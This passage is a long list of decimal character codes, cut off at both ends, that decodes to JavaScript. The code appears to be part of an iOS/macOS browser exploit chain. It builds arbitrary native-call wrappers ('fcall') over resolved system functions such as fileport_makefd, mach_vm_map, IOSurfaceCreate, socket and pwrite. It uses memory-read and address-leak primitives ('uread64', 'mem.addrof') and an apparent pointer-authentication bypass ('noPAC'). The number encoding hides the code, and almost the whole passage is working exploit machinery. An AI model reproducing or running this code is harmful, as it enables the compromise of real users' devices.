89, 78, 67, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 115, 121, 110, 99, 34, 41, 59, 10, 108, 101, 116, 32, 70, 73, 76, 69, 80, 79, 82, 84, 95, 77, 65, 75, 69, 70, 68, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 105, 108, 101, 112, 111, 114, 116, 95, 109, 97, 107, 101, 102, 100, 34, 41, 59, 10, 108, 101, 116, 32, 70, 73, 76, 69, 80, 79, 82, 84, 95, 77, 65, 75, 69, 80, 79, 82, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 105, 108, 101, 112, 111, 114, 116, 95, 109, 97, 107, 101, 112, 111, 114, 116, 34, 41, 59, 10, 108, 101, 116, 32, 70, 79, 80, 69, 78, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 111, 112, 101, 110, 34, 41, 59, 10, 108, 101, 116, 32, 70, 67, 76, 79, 83, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 99, 108, 111, 115, 101, 34, 41, 59, 10, 108, 101, 116, 32, 70, 87, 82, 73, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 119, 114, 105, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 71, 69, 84, 83, 79, 67, 75, 79, 80, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 103, 101, 116, 115, 111, 99, 107, 111, 112, 116, 34, 41, 59, 10, 108, 101, 116, 32, 76, 83, 69, 69, 75, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 108, 115, 101, 101, 107, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 84, 72, 82, 69, 65, 68, 95, 83, 69, 76, 70, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 34, 41, 59, 10, 108, 101, 116, 32, 77, 69, 77, 77, 69, 77, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 101, 109, 109, 101, 109, 34, 41, 59, 10, 108, 101, 116, 32, 77, 69, 77, 83, 69, 84, 95, 80, 65, 84, 84, 69, 82, 78, 56, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 101, 109, 115, 101, 116, 95, 112, 97, 116, 116, 101, 114, 110, 56, 34, 41, 59, 10, 108, 101, 116, 32, 79, 80, 69, 78, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 112, 101, 110, 34, 41, 59, 10, 108, 101, 116, 32, 80, 82, 69, 65, 68, 86, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 114, 101, 97, 100, 118, 34, 41, 59, 10, 108, 101, 116, 32, 80, 87, 82, 73, 84, 69, 86, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 119, 114, 105, 116, 101, 118, 34, 41, 59, 10, 108, 101, 116, 32, 80, 87, 82, 73, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 119, 114, 105, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 80, 82, 69, 65, 68, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 114, 101, 97, 100, 34, 41, 59, 10, 108, 101, 116, 32, 82, 69, 65, 68, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 114, 101, 97, 100, 34, 41, 59, 10, 108, 101, 116, 32, 83, 69, 84, 83, 79, 67, 75, 79, 80, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 101, 116, 115, 111, 99, 107, 111, 112, 116, 34, 41, 59, 10, 108, 101, 116, 32, 83, 79, 67, 75, 69, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 111, 99, 107, 101, 116, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 67, 65, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 99, 97, 116, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 83, 84, 82, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 115, 116, 114, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 76, 69, 78, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 108, 101, 110, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 78, 67, 77, 80, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 110, 99, 109, 112, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 82, 67, 72, 82, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 114, 99, 104, 114, 34, 41, 59, 10, 108, 101, 116, 32, 80, 84, 72, 82, 69, 65, 68, 95, 83, 69, 76, 70, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 34, 41, 59, 10, 108, 101, 116, 32, 80, 84, 72, 82, 69, 65, 68, 95, 74, 79, 73, 78, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 116, 104, 114, 101, 97, 100, 95, 106, 111, 105, 110, 34, 41, 59, 10, 108, 101, 116, 32, 87, 82, 73, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 119, 114, 105, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 82, 69, 77, 79, 86, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 114, 101, 109, 111, 118, 101, 34, 41, 59, 10, 108, 101, 116, 32, 65, 82, 67, 52, 82, 65, 78, 68, 79, 77, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 97, 114, 99, 52, 114, 97, 110, 100, 111, 109, 34, 41, 59, 10, 108, 101, 116, 32, 84, 65, 83, 75, 95, 84, 72, 82, 69, 65, 68, 83, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 116, 97, 115, 107, 95, 116, 104, 114, 101, 97, 100, 115, 34, 41, 59, 10, 108, 101, 116, 32, 84, 72, 82, 69, 65, 68, 95, 83, 85, 83, 80, 69, 78, 68, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 116, 104, 114, 101, 97, 100, 95, 115, 117, 115, 112, 101, 110, 100, 34, 41, 59, 10, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 77, 65, 75, 69, 95, 77, 69, 77, 79, 82, 89, 95, 69, 78, 84, 82, 89, 95, 54, 52, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 109, 97, 107, 101, 95, 109, 101, 109, 111, 114, 121, 95, 101, 110, 116, 114, 121, 95, 54, 52, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 80, 79, 82, 84, 95, 68, 69, 65, 76, 76, 79, 67, 65, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 112, 111, 114, 116, 95, 100, 101, 97, 108, 108, 111, 99, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 86, 77, 95, 77, 65, 80, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 118, 109, 95, 109, 97, 112, 34, 41, 59, 10, 108, 101, 116, 32, 77, 77, 65, 80, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 109, 97, 112, 34, 41, 59, 10, 108, 101, 116, 32, 77, 76, 79, 67, 75, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 108, 111, 99, 107, 34, 41, 59, 10, 108, 101, 116, 32, 77, 85, 78, 76, 79, 67, 75, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 117, 110, 108, 111, 99, 107, 34, 41, 59, 10, 108, 101, 116, 32, 85, 78, 65, 77, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 117, 110, 97, 109, 101, 34, 41, 59, 10, 10, 108, 101, 116, 32, 73, 79, 83, 85, 82, 70, 65, 67, 69, 67, 82, 69, 65, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 73, 79, 83, 117, 114, 102, 97, 99, 101, 67, 114, 101, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 73, 79, 83, 85, 82, 70, 65, 67, 69, 80, 82, 69, 70, 69, 84, 67, 72, 80, 65, 71, 69, 83, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 73, 79, 83, 117, 114, 102, 97, 99, 101, 80, 114, 101, 102, 101, 116, 99, 104, 80, 97, 103, 101, 115, 34, 41, 59, 10, 108, 101, 116, 32, 73, 79, 83, 85, 82, 70, 65, 67, 69, 71, 69, 84, 66, 65, 83, 69, 65, 68, 68, 82, 69, 83, 83, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 73, 79, 83, 117, 114, 102, 97, 99, 101, 71, 101, 116, 66, 97, 115, 101, 65, 100, 100, 114, 101, 115, 115, 34, 41, 59, 10, 108, 101, 116, 32, 107, 73, 79, 83, 117, 114, 102, 97, 99, 101, 65, 108, 108, 111, 99, 83, 105, 122, 101, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 73, 79, 83, 117, 114, 102, 97, 99, 101, 65, 108, 108, 111, 99, 83, 105, 122, 101, 34, 41, 46, 110, 111, 80, 65, 67, 40, 41, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 68, 85, 77, 80, 40, 97, 100, 100, 114, 44, 32, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 47, 47, 32, 102, 99, 97, 108, 108, 40, 108, 111, 99, 97, 108, 95, 100, 117, 109, 112, 44, 32, 97, 100, 100, 114, 44, 32, 115, 122, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 106, 115, 95, 109, 97, 108, 108, 111, 99, 40, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 98, 117, 102, 102, 32, 61, 32, 110, 101, 119, 32, 85, 105, 110, 116, 56, 65, 114, 114, 97, 121, 40, 66, 105, 103, 73, 110, 116, 40, 115, 122, 41, 46, 97, 115, 73, 110, 116, 51, 50, 115, 41, 46, 102, 105, 108, 108, 40, 48, 120, 48, 48, 41, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 117, 114, 101, 97, 100, 54, 52, 40, 109, 101, 109, 46, 97, 100, 100, 114, 111, 102, 40, 98, 117, 102, 102, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 84, 72, 82, 69, 65, 68, 95, 83, 69, 76, 70, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 115, 112, 101, 99, 105, 102, 105, 99, 40, 107, 101, 121, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 84, 72, 82, 69, 65, 68, 95, 71, 69, 84, 83, 80, 69, 67, 73, 70, 73, 67, 44, 32, 107, 101, 121, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 84, 72, 82, 69, 65, 68, 95, 83, 69, 76, 70, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 116, 104, 114, 101, 97, 100, 95, 106, 111, 105, 110, 40, 116, 104, 114, 44, 32, 118, 97, 108, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 84, 72, 82, 69, 65, 68, 95, 74, 79, 73, 78, 44, 32, 116, 104, 114, 44, 32, 118, 97, 108, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 95, 78, 83, 71, 101, 116, 69, 120, 101, 99, 117, 116, 97, 98, 108, 101, 80, 97, 116, 104, 40, 101, 120, 101, 99, 117, 116, 97, 98, 108, 101, 95, 112, 97, 116, 104, 44, 32, 108, 101, 110, 103, 116, 104, 95, 112, 116, 114, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 95, 78, 83, 71, 69, 84, 69, 88, 69, 67, 85, 84, 65, 66, 76, 69, 80, 65, 84, 72, 44, 32, 101, 120, 101, 99, 117, 116, 97, 98, 108, 101, 95, 112, 97, 116, 104, 44, 32, 108, 101, 110, 103, 116, 104, 95, 112, 116, 114, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 111, 110, 102, 115, 116, 114, 40, 110, 97, 109, 101, 44, 32, 98, 117, 102, 44, 32, 108, 101, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 79, 78, 70, 83, 84, 82, 44, 32, 110, 97, 109, 101, 44, 32, 98, 117, 102, 44, 32, 108, 101, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 114, 99, 104, 114, 40, 115, 44, 32, 99, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 82, 67, 72, 82, 44, 32, 115, 44, 32, 99, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 99, 97, 116, 40, 115, 49, 44, 32, 115, 50, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 67, 65, 84, 44, 32, 115, 49, 44, 32, 115, 50, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 108, 101, 110, 40, 115, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 76, 69, 78, 44, 32, 115, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 115, 116, 114, 40, 115, 49, 44, 32, 115, 50, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 83, 84, 82, 44, 32, 115, 49, 44, 32, 115, 50, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 110, 99, 109, 112, 40, 115, 49, 44, 32, 115, 50, 44, 32, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 78, 67, 77, 80, 44, 32, 115, 49, 44, 32, 115, 50, 44, 32, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 111, 99, 107, 101, 116, 40, 100, 111, 109, 97, 105, 110, 44, 32, 116, 121, 112, 101, 44, 32, 112, 114, 111, 116, 111, 99, 111, 108, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 79, 67, 75, 69, 84, 44, 32, 100, 111, 109, 97, 105, 110, 44, 32, 116, 121, 112, 101, 44, 32, 112, 114, 111, 116, 111, 99, 111, 108, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 103, 101, 116, 115, 111, 99, 107, 111, 112, 116, 40, 115, 111, 99, 107, 101, 116, 44, 32, 108, 101, 118, 101, 108, 44, 32, 111, 112, 116, 105, 111, 110, 95, 110, 97, 109, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 118, 97, 108, 117, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 108, 101, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 71, 69, 84, 83, 79, 67, 75, 79, 80, 84, 44, 32, 115, 111, 99, 107, 101, 116, 44, 32, 108, 101, 118, 101, 108, 44, 32, 111, 112, 116, 105, 111, 110, 95, 110, 97, 109, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 118, 97, 108, 117, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 108, 101, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 101, 116, 115, 111, 99, 107, 111, 112, 116, 40, 115, 111, 99, 107, 101, 116, 44, 32, 108, 101, 118, 101, 108, 44, 32, 111, 112, 116, 105, 111, 110, 95, 110, 97, 109, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 118, 97, 108, 117, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 108, 101, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 69, 84, 83, 79, 67, 75, 79, 80, 84, 44, 32, 115, 111, 99, 107, 101, 116, 44, 32, 108, 101, 118, 101, 108, 44, 32, 111, 112, 116, 105, 111, 110, 95, 110, 97, 109, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 118, 97, 108, 117, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 108, 101, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 105, 108, 101, 112, 111, 114, 116, 95, 109, 97, 107, 101, 112, 111, 114, 116, 40, 102, 100, 44, 32, 112, 111, 114, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 73, 76, 69, 80, 79, 82, 84, 95, 77, 65, 75, 69, 80, 79, 82, 84, 44, 32, 102, 100, 44, 32, 112, 111, 114, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 105, 108, 101, 112, 111, 114, 116, 95, 109, 97, 107, 101, 102, 100, 40, 112, 111, 114, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 73, 76, 69, 80, 79, 82, 84, 95, 77, 65, 75, 69, 70, 68, 44, 32, 112, 111, 114, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 109, 115, 101, 116, 95, 112, 97, 116, 116, 101, 114, 110, 56, 40, 98, 117, 102, 44, 32, 118, 97, 108, 44, 32, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 69, 77, 83, 69, 84, 95, 80, 65, 84, 84, 69, 82, 78, 56, 44, 32, 98, 117, 102, 44, 32, 118, 97, 108, 44, 32, 115, 122, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 109, 109, 101, 109, 40, 98, 105, 103, 44, 32, 98, 105, 103, 95, 108, 101, 110, 44, 32, 108, 105, 116, 116, 108, 101, 44, 32, 108, 105, 116, 116, 108, 101, 95, 108, 101, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 69, 77, 77, 69, 77, 44, 32, 98, 105, 103, 44, 32, 98, 105, 103, 95, 108, 101, 110, 44, 32, 108, 105, 116, 116, 108, 101, 44, 32, 108, 105, 116, 116, 108, 101, 95, 108, 101, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 97, 99, 99, 101, 115, 115, 40, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 65, 67, 67, 69, 83, 83, 44, 32, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 112, 101, 110, 40, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 80, 69, 78, 44, 32, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 111, 112, 101, 110, 40, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 79, 80, 69, 78, 44, 32, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 99, 108, 111, 115, 101, 40, 102, 100, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 67, 76, 79, 83, 69, 44, 32, 102, 100, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 119, 114, 105, 116, 101, 40, 98, 117, 102, 44, 32, 115, 122, 44, 32, 110, 105, 116, 101, 109, 44, 32, 102, 100, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 87, 82, 73, 84, 69, 44, 32, 98, 117, 102, 44, 32, 115, 122, 44, 32, 110, 105, 116, 101, 109, 44, 32, 102, 100, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 114, 101, 97, 100, 118, 40, 102, 105, 108, 100, 101, 115, 44, 32, 105, 111, 118, 44, 32, 105, 111, 118, 99, 110, 116, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 82, 69, 65, 68, 86, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 105, 111, 118, 44, 32, 105, 111, 118, 99, 110, 116, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 119, 114, 105, 116, 101, 118, 40, 102, 105, 108, 100, 101, 115, 44, 32, 105, 111, 118, 44, 32, 105, 111, 118, 99, 110, 116, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 87, 82, 73, 84, 69, 86, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 105, 111, 118, 44, 32, 105, 111, 118, 99, 110, 116, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 119, 114, 105, 116, 101, 40, 102, 105, 108, 100, 101, 115, 44, 32, 98, 117, 102, 102, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 87, 82, 73, 84, 69, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 98, 117, 102, 102, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 114, 101, 97, 100, 40, 102, 105, 108, 100, 101, 115, 44, 32, 98, 117, 102, 102, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 82, 69, 65, 68, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 98, 117, 102, 102, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 114, 101, 97, 100, 40, 102, 100, 44, 32, 98, 117, 102, 44, 32, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 82, 69, 65, 68, 44, 32, 102, 100, 44, 32, 98, 117, 102, 44, 32, 115, 122, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 119, 114, 105, 116, 101, 40, 102, 100, 44, 32, 98, 117, 102, 44, 32, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 87, 82, 73, 84, 69, 44, 32, 102, 100, 44, 32, 98, 117, 102, 44, 32, 115, 122, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 114, 101, 109, 111, 118, 101, 40, 112, 97, 116, 104, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 82, 69, 77, 79, 86, 69, 44, 32, 112, 97, 116, 104, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 97, 114, 99, 52, 114, 97, 110, 100, 111, 109, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 65, 82, 67, 52, 82, 65, 78, 68, 79, 77, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 116, 97, 115, 107, 95, 116, 104, 114, 101, 97, 100, 115, 40, 116, 97, 115, 107, 44, 32, 116, 104, 114, 101, 97, 100, 95, 108, 105, 115, 116, 95, 97, 100, 100, 114, 44, 32, 116, 104, 114, 101, 97, 100, 95, 99, 111, 117, 110, 116, 95, 97, 100, 100, 114, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 84, 65, 83, 75, 95, 84, 72, 82, 69, 65, 68, 83, 44, 32, 116, 97, 115, 107, 44, 32, 116, 104, 114, 101, 97, 100, 95, 108, 105, 115, 116, 95, 97, 100, 100, 114, 44, 32, 116, 104, 114, 101, 97, 100, 95, 99, 111, 117, 110, 116, 95, 97, 100, 100, 114, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 99, 110, 116, 108, 40, 102, 100, 44, 32, 102, 108, 97, 103, 44, 32, 118, 97, 108, 117, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 67, 78, 84, 76, 44, 32, 102, 100, 44, 32, 102, 108, 97, 103, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 118, 97, 108, 117, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 108, 115, 101, 101, 107, 40, 102, 105, 108, 100, 101, 115, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 